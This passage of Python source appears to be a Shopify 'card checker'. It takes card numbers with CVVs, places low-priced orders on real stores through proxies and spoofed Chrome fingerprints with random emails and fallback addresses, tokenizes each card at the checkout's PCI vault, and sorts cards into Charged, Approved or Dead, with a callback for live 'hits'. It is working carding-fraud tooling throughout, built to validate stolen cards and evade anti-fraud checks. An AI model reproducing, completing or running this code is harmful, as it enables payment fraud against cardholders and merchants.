def extract_pci_session_id(body: str) -> str:
    m = re.search(r'"id"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def extract_delivery_handle(body: str) -> str:
    try:
        data = json.loads(body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle")
        if h: return h
        h = dlv.get("deliveryStrategyHandle")
        if h: return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                handles = macro.get("deliveryStrategyHandles", [])
                if handles: return handles[0]
    except Exception:
        pass
    for p in [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(p, body)
        if m: return m.group(1)
    return ""


def extract_signed_handles(body: str) -> List[str]:
    try:
        data = json.loads(body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        de = seller.get("deliveryExpectations", {})
        typename = de.get("__typename", "")
        if typename == "FilledDeliveryExpectationTerms":
            return [x["signedHandle"] for x in de.get("deliveryExpectations", [])
                    if x.get("signedHandle")]
        if "deliveryExpectations" in de and isinstance(de["deliveryExpectations"], list):
            return [x.get("signedHandle") or x.get("deliveryOptionHandle")
                    or x.get("deliveryStrategyHandle")
                    for x in de["deliveryExpectations"]
                    if x.get("signedHandle") or x.get("deliveryOptionHandle")
                    or x.get("deliveryStrategyHandle")]
    except Exception:
        pass
    return []


def extract_checkout_total(body: str) -> str:
    try:
        data = json.loads(body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        for key in ("checkoutTotal", "runningTotal", "total"):
            node = seller.get(key)
            if isinstance(node, dict):
                amt = node.get("value", {}).get("amount") if "value" in node else node.get("amount")
                if amt: return amt
    except Exception:
        pass
    m = re.search(r'"checkoutTotal"\s*:\s*\{\s*"value"\s*:\s*\{\s*"amount"\s*:\s*"([^"]+)"', body)
    return m.group(1) if m else ""


def extract_shipping_amount(body: str) -> str:
    try:
        data = json.loads(body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        for line in seller.get("delivery", {}).get("deliveryLines", []):
            selected = line.get("selectedDeliveryStrategy", {}).get("handle")
            for strat in line.get("availableDeliveryStrategies", []):
                if strat.get("handle") == selected:
                    amt = strat.get("amount", {}).get("value", {}).get("amount")
                    if amt: return amt
    except Exception:
        pass
    return ""


def extract_tax_amount(body: str) -> str:
    try:
        data = json.loads(body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        return (seller.get("tax", {}).get("totalTaxAmount", {})
                      .get("value", {}).get("amount", "0.0"))
    except Exception:
        return "0.0"


def extract_seller_currency(body: str) -> str:
    m = re.search(r'"supportedCurrencies"\s*:\s*\["([^"]+)"', body)
    return m.group(1) if m else ""


def extract_seller_country(body: str) -> str:
    m = re.search(r'"supportedCountries"\s*:\s*\["([^"]+)"', body)
    return m.group(1) if m else ""


def extract_is_shipping_required(body: str) -> bool:
    try:
        data = json.loads(body)
        seller = (data.get("data", {}).get("session", {}).get("negotiate", {})
                      .get("result", {}).get("sellerProposal", {}))
        return seller.get("isShippingRequired", True)
    except Exception:
        return True


def detect_shipping_restriction(body: str) -> bool:
    signals = ["SHIPPING_ADDRESS_UNDELIVERABLE", "no_delivery_options_available",
               "delivery is not available", "does not ship to"]
    low = body.lower()
    return any(s.lower() in low for s in signals)


_ERROR_MAP = {
    "risky": "RISK_REJECTED", "fraud": "RISK_REJECTED",
    "do not honor": "DO_NOT_HONOR", "insufficient funds": "INSUFFICIENT_FUNDS",
    "card declined": "CARD_DECLINED", "invalid card": "CARD_INVALID",
    "expired card": "CARD_EXPIRED", "incorrect cvc": "CVV_INVALID",
    "security code": "CVV_INVALID", "stolen card": "CARD_STOLEN",
    "throttled": "RATE_LIMITED", "too many": "RATE_LIMITED",
    "captcha": "CAPTCHA_REQUIRED", "terms": "TERMS_REQUIRED",
}


def _map_error(raw: str) -> str:
    low = raw.lower()
    for k, v in _ERROR_MAP.items():
        if k in low:
            return v
    return raw.upper().replace(" ", "_")[:40]


def extract_any_error(body: str) -> str:
    for p in [r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
              r'"localizedMessage"\s*:\s*"([^"]+)"',
              r'"code"\s*:\s*"([^"]+)"',
              r'"message"\s*:\s*"([^"]+)"']:
        m = re.search(p, body)
        if m:
            return _map_error(m.group(1))
    return ""


# ──────────────────────── Payload patcher ────────────────────────────

def patch_payload(payload: str, currency: str, country: str) -> str:
    if currency == "USD" and country == "US":
        return payload
    try:
        data = json.loads(payload)
    except json.JSONDecodeError:
        return payload

    def _walk(obj, in_buyer=False):
        if isinstance(obj, dict):
            out = {}
            for k, v in obj.items():
                if k == "presentmentCurrency" and v == "USD" and currency != "USD":
                    out[k] = currency
                elif k == "phoneCountryCode" and v == "US" and country != "US":
                    out[k] = country
                elif k == "countryCode" and v == "US" and country != "US" and in_buyer:
                    out[k] = country
                elif k == "customer":
                    out[k] = _walk(v, True)
                else:
                    out[k] = _walk(v, in_buyer)
            return out
        if isinstance(obj, list):
            return [_walk(i, in_buyer) for i in obj]
        return obj

    return json.dumps(_walk(data), separators=(",", ":"))


def generate_attempt_token(checkout_token: str) -> str:
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return f"{checkout_token}-{''.join(random.choice(chars) for _ in range(10))}"


def generate_page_id() -> str:
    return f"{random.getrandbits(64):016x}"


# ──────────────────────── PCI tokenization ───────────────────────────

def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                     card_month: int, card_year: int, cvv: str,
                     shop_domain: str, proxy_url: str = "",
                     vault_url: str = "", vault_domain: str = "",
                     impersonate: str = "chrome124") -> Tuple[int, str]:
    endpoint = vault_url or "https://checkout.pci.shopifyinc.com/sessions"
    scope = vault_domain or shop_domain
    origin_base = endpoint.rsplit("/sessions", 1)[0]

    payload = json.dumps({
        "credit_card": {
            "number": card_number, "month": card_month, "year": card_year,
            "verification_value": cvv, "start_month": None, "start_year": None,
            "issue_number": "", "name": card_name,
        },
        "payment_session_scope": scope,
    })
    headers = {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": origin_base,
        "referer": f"{origin_base}/build/a8e4a94/number-ltr.html",
        "sec-ch-ua": '"Chromium";v="124", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-identification-signature": ident_sig,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    }
    with Session(impersonate=impersonate) as s:
        kw = {"data": payload, "headers": headers, "timeout": 20}
        if proxy_url:
            kw["proxy"] = proxy_url
        r = s.post(endpoint, **kw)
    return r.status_code, r.text


def _proposal_headers(shop_url, checkout_url, checkout_token, session_token, build_id, source_token):
    return {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "referer": checkout_url,
        "sec-ch-ua": '"Chromium";v="124", "Not/A)Brand";v="99"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }


# ──────────────────────── Proposal payload ───────────────────────────

def _proposal_payload(session_token, queue_token, stable_id, variant_id,
                      email, addr, currency, country, proposal_id):
    email_field = f'"email": "{email}", "emailChanged": true,' if email else ''
    queue_str = json.dumps(queue_token) if queue_token else 'null'
    return f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": "{session_token}"}},
    "queueToken": {queue_str},
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [{{
        "destination": {{
          "partialStreetAddress": {{
            "address1": "{addr.address1}", "address2": "{addr.address2}",
            "city": "{addr.city}", "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}", "oneTimeUse": false
          }}
        }},
        "selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }},
        "targetMerchandiseLines": {{"any": true}},
        "deliveryMethodTypes": ["SHIPPING"],
        "expectedTotalPrice": {{"any": true}},
        "destinationChanged": true
      }}],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [{{
        "stableId": "{stable_id}",
        "merchandise": {{
          "productVariantReference": {{
            "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
            "variantId": "gid://shopify/ProductVariant/{variant_id}",
            "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
          }}
        }},
        "quantity": {{"items": {{"value": 1}}}},
        "expectedTotalPrice": {{"any": true}},
        "lineComponentsSource": null, "lineComponents": []
      }}]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      "billingAddress": {{
        "streetAddress": {{
          "address1": "{addr.address1}", "address2": "{addr.address2}",
          "city": "{addr.city}", "countryCode": "{addr.country_code}",
          "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
          "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
          "phone": "{addr.phone}"
        }}
      }}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
      {email_field}
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": []
  }},
  "operationName": "Proposal",
  "id": "{proposal_id}"
}}'''


def send_proposal(client, shop_url, checkout_url, checkout_token, session_token,
                  stable_id, variant_id, price, proposal_id, build_id,
                  source_token, email, addr, currency, country, queue_token=None):
    payload = _proposal_payload(session_token, queue_token, stable_id, variant_id,
                                email, addr, currency, country, proposal_id)
    payload = patch_payload(payload, currency, country)
    r = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=Proposal",
        data=payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token)
    )
    return r.status_code, r.text


def send_submit(client, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, submit_id, build_id, source_token,
                queue_token, email, addr, delivery_handle, shipping_amount,
                total_amount, pci_session_id, attempt_token, currency, country,
                signed_handles, is_digital=False, tax_amount="0.0"):
    handle_lines = [json.dumps({"signedHandle": h}) for h in (signed_handles or [])]
    signed_handles_json = "[" + ",".join(handle_lines) + "]"
    page_id = generate_page_id()

    if is_digital:
        total_block = '"totalAmount": {"any": true}'
        delivery_block = f'''"delivery": {{
          "deliveryLines": [{{
            "selectedDeliveryStrategy": {{
              "deliveryStrategyMatchingConditions": {{
                "estimatedTimeInTransit": {{"any": true}},
                "shipments": {{"any": true}}
              }},
              "options": {{}}
            }},
            "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
            "deliveryMethodTypes": ["NONE"],
            "expectedTotalPrice": {{"any": true}},
            "destinationChanged": true
          }}],
          "noDeliveryRequired": [],
          "useProgressiveRates": false,
          "prefetchShippingRatesStrategy": null,
          "supportsSplitShipping": true
        }},
        "deliveryExpectations": {{"deliveryExpectationLines": []}}'''
    else:
        total_block = f'"totalAmount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}'
        delivery_block = f'''"delivery": {{
          "deliveryLines": [{{
            "destination": {{
              "streetAddress": {{
                "address1": "{addr.address1}", "address2": "{addr.address2}",
                "city": "{addr.city}", "countryCode": "{addr.country_code}",
                "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
                "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
                "phone": "{addr.phone}", "oneTimeUse": false
              }}
            }},
            "selectedDeliveryStrategy": {{
              "deliveryStrategyByHandle": {{
                "handle": "{delivery_handle}", "customDeliveryRate": false
              }},
              "options": {{}}
            }},
            "targetMerchandiseLines": {{"lines": [{{"stableId": "{stable_id}"}}]}},
            "deliveryMethodTypes": ["SHIPPING"],
            "expectedTotalPrice": {{"any": true}},
            "destinationChanged": false
          }}],
          "noDeliveryRequired": [],
          "useProgressiveRates": false,
          "prefetchShippingRatesStrategy": null,
          "supportsSplitShipping": true
        }},
        "deliveryExpectations": {{"deliveryExpectationLines": {signed_handles_json}}}'''

    payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": "{session_token}"}},
      "queueToken": "{queue_token}",
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      {delivery_block},
      "merchandise": {{
        "merchandiseLines": [{{
          "stableId": "{stable_id}",
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [], "sellingPlanId": null, "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null, "lineComponents": []
        }}]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        {total_block},
        "paymentLines": [{{
          "paymentMethod": {{
            "directPaymentMethod": {{
              "sessionId": "{pci_session_id}",
              "billingAddress": {{
                "streetAddress": {{
                  "address1": "{addr.address1}", "address2": "{addr.address2}",
                  "city": "{addr.city}", "countryCode": "{addr.country_code}",
                  "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
                  "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
                  "phone": "{addr.phone}"
                }}
              }},
              "cardSource": null
            }}
          }},
          "amount": {{"value": {{"amount": "{total_amount}", "currencyCode": "USD"}}}}
        }}],
        "billingAddress": {{
          "streetAddress": {{
            "address1": "{addr.address1}", "address2": "{addr.address2}",
            "city": "{addr.city}", "countryCode": "{addr.country_code}",
            "postalCode": "{addr.postal_code}", "firstName": "{addr.first_name}",
            "lastName": "{addr.last_name}", "zoneCode": "{addr.zone_code}",
            "phone": "{addr.phone}"
          }}
        }}
      }},
      "buyerIdentity": {{
        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
        "email": "{email}",
        "emailChanged": false,
        "phoneCountryCode": "US",
        "marketingConsent": [],
        "shopPayOptInPhone": {{"countryCode": "US"}},
        "rememberMe": false
      }},
      "tip": {{"tipLines": []}},
      "poNumber": null,
      "taxes": {{
        "proposedAllocations": null,
        "proposedTotalAmount": {{"value": {{"amount": "{tax_amount}", "currencyCode": "USD"}}}},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }},
      "note": {{"message": null, "customAttributes": []}},
      "localizationExtension": {{"fields": []}},
      "nonNegotiableTerms": null,
      "scriptFingerprint": {{
        "signature": null, "signatureUuid": null,
        "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
      }},
      "optionalDuties": {{"buyerRefusesDuties": false}},
      "cartMetafields": []
    }},
    "attemptToken": "{attempt_token}",
    "metafields": [],
    "analytics": {{"requestUrl": "{checkout_url}", "pageId": "{page_id}"}}
  }},
  "operationName": "SubmitForCompletion",
  "id": "{submit_id}"
}}'''
    payload = patch_payload(payload, currency, country)
    r = client.post(
        f"{shop_url}/checkouts/internal/graphql/persisted?operationName=SubmitForCompletion",
        data=payload,
        headers=_proposal_headers(shop_url, checkout_url, checkout_token,
                                  session_token, build_id, source_token)
    )
    return r.status_code, r.text


def send_poll(client, shop_url, checkout_url, checkout_token, session_token,
              build_id, source_token, poll_id, receipt_id, receipt_session_token):
    params = {
        "operationName": "PollForReceipt",
        "variables": json.dumps({"receiptId": receipt_id, "sessionToken": receipt_session_token}),
        "id": poll_id,
    }
    url = f"{shop_url}/checkouts/internal/graphql/persisted?{urllib.parse.urlencode(params)}"
    headers = _proposal_headers(shop_url, checkout_url, checkout_token,
                                session_token, build_id, source_token)
    headers["x-checkout-web-source-id"] = checkout_token
    r = client.get(url, headers=headers)
    return r.status_code, r.text


# ──────────────────────── Real charge verifier ───────────────────────

def is_real_charge(poll_body: str) -> Tuple[bool, str]:
    try:
        data = json.loads(poll_body)
    except Exception:
        return False, ""
    receipt = (data.get("data") or {}).get("receipt") or {}
    if not receipt:
        return False, ""
    po = receipt.get("purchaseOrder") or {}
    total = ((po.get("totalAmountToPay") or {}).get("amount")
             or (po.get("checkoutTotal") or {}).get("amount")
             or "")
    if not total or total in ("0.00", "0", "0.0"):
        return False, ""
    conf = receipt.get("confirmationPage") or {}
    conf_url = conf.get("url", "") if isinstance(conf, dict) else ""
    if conf_url and "/orders/" in conf_url:
        return True, conf_url
    osp = receipt.get("orderStatusPageUrl") or ""
    if osp and "/orders/" in osp:
        return True, osp
    return True, conf_url or osp or ""


# ──────────────────────── Main orchestrator ──────────────────────────

def run_checkout_for_card(shop_url: str, card_entry: str,
                          proxy_url: str = "", low: bool = True) -> CheckResult:
    t_start = time.time()
    stage_timings: Dict[str, int] = {}

    def _mark(stage: str, t0: float):
        stage_timings[stage] = int((time.time() - t0) * 1000)

    currency = "USD"
    country = "US"
    site_name = urllib.parse.urlparse(shop_url).hostname or shop_url
    domain = site_name

    result = CheckResult(
        card=card_entry, shop_url=shop_url, site_name=site_name,
        currency=currency, status=CheckStatus.ERROR,
        stage_timings=stage_timings,
    )

    if _BREAKER.is_open(domain):
        result.error = Exception("circuit breaker open")
        result.status_code = "CIRCUIT_OPEN"
        result.duration_ms = int((time.time() - t_start) * 1000)
        return result

    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
        if not validate_card_luhn(card_number):
            result.status_code = "CARD_INVALID_LUHN"
            result.error = Exception("Luhn check failed")
            result.duration_ms = int((time.time() - t_start) * 1000)
            return result
    except Exception as e:
        result.error = e
        result.duration_ms = int((time.time() - t_start) * 1000)
        return result

    if proxy_url and not is_proxy_alive(proxy_url):
        result.status_code = "PROXY_DEAD"
        result.error = Exception("proxy health check failed")
        result.duration_ms = int((time.time() - t_start) * 1000)
        return result

    email = generate_random_email()
    client = TLSClient(timeout=20, proxy_url=proxy_url)

    try:
        # Step 0
        t0 = time.time()
        try:
            max_p = 5.00 if low else float("inf")
            title, product_id, variant_id, price = find_cheapest_product(
                client, shop_url, max_price=max_p)
            _mark("step0_product", t0)
        except Exception as e:
            result.error = Exception(f"Step 0: {e}")
            result.retryable = True
            _mark("step0_product", t0)
            _BREAKER.record_failure(domain)
            return _finalize(result, t_start)
        _BREAKER.record_success(domain)

        # Step 1
        t0 = time.time()
        try:
            checkout_url, checkout_token, session_token, checkout_html = \
                add_to_cart_and_checkout(client, shop_url, variant_id)
            stable_id = extract_stable_id(checkout_html)
            build_id = extract_commit_sha(checkout_html)
            source_token = extract_source_token(checkout_html)
            if not all([stable_id, build_id, source_token]):
                raise Exception("missing tokens")
            _mark("step1_checkout", t0)
        except Exception as e:
            result.error = Exception(f"Step 1: {e}")
            result.retryable = True
            _mark("step1_checkout", t0)
            return _finalize(result, t_start)

        # Step 2: PAT (best-effort)
        t0 = time.time()
        try:
            pat_id = extract_private_access_token_id(checkout_html)
            if pat_id:
                client.get(
                    f"{shop_url}/private_access_tokens?id={urllib.parse.quote(pat_id)}&checkout_type=c1",
                    headers={"referer": checkout_url, "accept": "*/*"}
                )
            _mark("step2_pat", t0)
        except Exception as e:
            logger.debug(f"PAT skip: {e!r}")

        # Step 3: actions JS
        t0 = time.time()
        try:
            actions_url = extract_actions_js_url(checkout_html, shop_url)
            if not actions_url:
                raise Exception("no actions JS URL")
            js_body = client.get(actions_url).text
            proposal_id = extract_proposal_id(js_body)
            submit_id = extract_submit_id(js_body)
            poll_id = extract_poll_id(js_body)
            if not proposal_id or not submit_id:
                raise Exception("missing operation IDs")
            _mark("step3_actions", t0)
        except Exception as e:
            result.error = Exception(f"Step 3: {e}")
            result.retryable = True
            _mark("step3_actions", t0)
            return _finalize(result, t_start)

        # Steps 4-8: proposals
        t0 = time.time()
        try:
            addr = pick_address_for_store(shop_url, currency, country)
            country = addr.country_code

            # P1 (no email) — negotiate currency/country
            s, body = send_proposal(client, shop_url, checkout_url, checkout_token,
                                    session_token, stable_id, variant_id, price,
                                    proposal_id, build_id, source_token, None,
                                    addr, currency, country, None)
            cur = extract_seller_currency(body)
            if cur: currency = cur
            ctr = extract_seller_country(body)
            if ctr: country = ctr
            queue_token = extract_queue_token(body)
            if not queue_token:
                raise Exception("no queue_token from P1")

            # P2 (add email)
            s, body = send_proposal(client, shop_url, checkout_url, checkout_token,
                                    session_token, stable_id, variant_id, price,
                                    proposal_id, build_id, source_token, email,
                                    addr, currency, country, queue_token)
            queue_token = extract_queue_token(body) or queue_token

            # P3 (full address) + country fallback loop
            fallback = get_fallback_addresses(addr.country_code)
            final_body = None
            final_addr = addr
            is_digital = False
            for i in range(1 + len(fallback)):
                s, body = send_proposal(client, shop_url, checkout_url, checkout_token,
                                        session_token, stable_id, variant_id, price,
                                        proposal_id, build_id, source_token, email,
                                        addr, currency, country, queue_token)
                qt = extract_queue_token(body)
                if not qt:
                    raise Exception("no queue_token")
                _dig = not extract_is_shipping_required(body)
                if _dig or not detect_shipping_restriction(body):
                    final_body = body
                    final_addr = addr
                    is_digital = _dig
                    queue_token = qt
                    break
                if i < len(fallback):
                    addr = fallback[i]
                    country = addr.country_code
                    queue_token = qt
            if not final_body:
                raise Exception("no shipping available")

            # P4 + P5 (confirm)
            for _ in range(2):
                s, final_body = send_proposal(client, shop_url, checkout_url, checkout_token,
                                              session_token, stable_id, variant_id, price,
                                              proposal_id, build_id, source_token, email,
                                              final_addr, currency, country, queue_token)
                queue_token = extract_queue_token(final_body) or queue_token
            addr = final_addr
            proposal5_body = final_body
            _mark("step4_8_proposals", t0)
        except Exception as e:
            result.error = Exception(f"Step 4-8: {e}")
            result.retryable = True
            _mark("step4_8_proposals", t0)
            return _finalize(result, t_start)

        # Step 9: PCI
        t0 = time.time()
        try:
            ident_sig = extract_identification_signature(checkout_html)
            vault_url = extract_vault_url(checkout_html)
            vault_domain = extract_vault_domain(checkout_html) or site_name
            if not ident_sig:
                raise Exception("no ident signature")
            card_name = f"{addr.first_name} {addr.last_name}"
            s, body = send_pci_session(ident_sig, card_number, card_name,
                                       card_month, card_year, card_cvv,
                                       vault_domain, proxy_url,
                                       vault_url=vault_url, vault_domain=vault_domain)
            pci_session_id = extract_pci_session_id(body)
            if not pci_session_id:
                raise Exception("no PCI session ID")
            _mark("step9_pci", t0)
        except Exception as e:
            result.error = Exception(f"Step 9: {e}")
            result.retryable = True
            _mark("step9_pci", t0)
            return _finalize(result, t_start)

        # Step 10: Submit
        t0 = time.time()
        try:
            queue_token5 = extract_queue_token(proposal5_body) or queue_token
            delivery_handle = extract_delivery_handle(proposal5_body)
            signed_handles = extract_signed_handles(proposal5_body)
            shipping_amount = extract_shipping_amount(proposal5_body) or "0.00"
            total_amount = extract_checkout_total(proposal5_body)
            if not total_amount:
                raise Exception("no total")
            result.amount = total_amount
            attempt_token = generate_attempt_token(checkout_token)
            current_tax = extract_tax_amount(proposal5_body)

            submit_status, submit_body = 0, ""
            for _ in range(3):
                submit_status, submit_body = send_submit(
                    client, shop_url, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, price, submit_id, build_id, source_token,
                    queue_token5, email, addr, delivery_handle, shipping_amount,
                    total_amount, pci_session_id, attempt_token, currency, country,
                    signed_handles, is_digital=is_digital, tax_amount=current_tax)
                if "TAX_NEW_TAX_MUST_BE_ACCEPTED" in submit_body:
                    m = re.search(r'"totalTaxAmount".*?"amount"\s*:\s*"([^"]+)"', submit_body)
                    if m:
                        current_tax = m.group(1)
                    continue
                break

            receipt_id = extract_receipt_id(submit_body)
            if not receipt_id:
                err = extract_any_error(submit_body) or "no receipt"
                result.status = CheckStatus.DECLINED
                result.status_code = err
                result.error = Exception(err)
                _mark("step10_submit", t0)
                return _finalize(result, t_start)

            receipt_session_token = extract_receipt_session_token(submit_body)
            if not receipt_session_token:
                raise Exception("no receipt sessionToken")
            _mark("step10_submit", t0)
        except Exception as e:
            result.error = Exception(f"Step 10: {e}")
            result.retryable = True
            _mark("step10_submit", t0)
            return _finalize(result, t_start)

        # Step 11: Poll
        t0 = time.time()
        for poll_num in range(1, 31):
            try:
                s, poll_body = send_poll(client, shop_url, checkout_url, checkout_token,
                                         session_token, build_id, source_token,
                                         poll_id, receipt_id, receipt_session_token)
                m = re.search(r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"', poll_body)
                rtype = m.group(1) if m else ""

                if rtype in ("SuccessfulReceipt", "ProcessedReceipt"):
                    real, url = is_real_charge(poll_body)
                    if real:
                        result.status = CheckStatus.CHARGED
                        result.status_code = "ORDER_PLACED"
                        result.receipt_url = url or checkout_url
                    else:
                        result.status = CheckStatus.APPROVED
                        result.status_code = "PAYMENT_PROCESSING"
                    _mark("step11_poll", t0)
                    return _finalize(result, t_start)

                if rtype == "ActionRequiredReceipt":
                    result.status = CheckStatus.APPROVED
                    result.status_code = "3DS_AUTHENTICATION"
                    _mark("step11_poll", t0)
                    return _finalize(result, t_start)

                if rtype == "FailedReceipt":
                    m2 = re.search(r'"code"\s*:\s*"([^"]+)"', poll_body)
                    code = m2.group(1) if m2 else "FAILED"
                    if code == "INSUFFICIENT_FUNDS":
                        result.status = CheckStatus.APPROVED
                        result.status_code = "INSUFFICIENT_FUNDS"
                    else:
                        result.status = CheckStatus.DECLINED
                        result.status_code = code
                        result.error = Exception(code)
                    _mark("step11_poll", t0)
                    return _finalize(result, t_start)

                time.sleep(1.0)
            except Exception as e:
                logger.debug(f"poll {poll_num}: {e!r}")

        result.status = CheckStatus.ERROR
        result.retryable = True
        result.error = Exception("poll timeout")
        _mark("step11_poll", t0)
        return _finalize(result, t_start)

    finally:
        client.close()


def _finalize(result: CheckResult, t_start: float) -> CheckResult:
    result.duration_ms = int((time.time() - t_start) * 1000)
    if _HIT_CALLBACK and result.status in (CheckStatus.CHARGED, CheckStatus.APPROVED):
        try:
            _HIT_CALLBACK(asdict(result))
        except Exception as e:
            logger.debug(f"hit callback failed: {e!r}")
    return result


def set_hit_callback(fn: Callable[[dict], None]):
    """Register a callback fired on every CHARGED/APPROVED result."""
    global _HIT_CALLBACK
    _HIT_CALLBACK = fn


# ──────────────────────── Public convenience wrapper ────────────────

def run_checkout_public(shop_url: str, card: str, proxy_url: str = "",
                        low: bool = True) -> dict:
    try:
        res = run_checkout_for_card(shop_url, card, proxy_url, low=low)
    except Exception as e:
        return {"status": "Error", "message": str(e)[:150],
                "card": card, "site": shop_url, "gateway": "Shopify",
                "price": "-", "price_value": 0.0,
                "proxy": proxy_url, "status_code": "EXCEPTION",
                "retryable": True, "currency": "USD", "receipt_url": "",
                "duration_ms": 0, "stage_timings": {}}

    name = res.status.name
    price = res.amount or '-'
    try:
        price_value = float(res.amount) if res.amount else 0.0
    except Exception:
        price_value = 0.0

    base = {
        "card": card, "site": shop_url, "gateway": "Shopify",
        "price": price, "price_value": price_value, "proxy": proxy_url,
        "currency": res.currency or "USD", "receipt_url": res.receipt_url or "",
        "duration_ms": res.duration_ms, "stage_timings": res.stage_timings,
    }

    if name == "CHARGED":
        return {**base, "status": "Charged", "message": res.status_code or "ORDER_PLACED",
                "status_code": "ORDER_PLACED", "retryable": False}
    if name == "APPROVED":
        return {**base, "status": "Approved", "message": res.status_code or "APPROVED",
                "status_code": res.status_code or "APPROVED", "retryable": False}
    if name == "DECLINED":
        return {**base, "status": "Dead", "message": res.status_code or "CARD_DECLINED",
                "status_code": res.status_code or "CARD_DECLINED", "retryable": False}
    return {**base, "status": "Error", "message": str(res.error or "error")[:150],
            "status_code": res.status_code or "ERROR", "retryable": res.retryable}


# ──────────────────────── Diagnostics ────────────────────────────────

def engine_stats() -> dict:
    return {
        "version": VERSION,
        "bin_cache": _BIN_CACHE.stats(),
        "circuit_breaker": _BREAKER.stats(),
        "proxy_pool_size": len(PROXY_POOL),
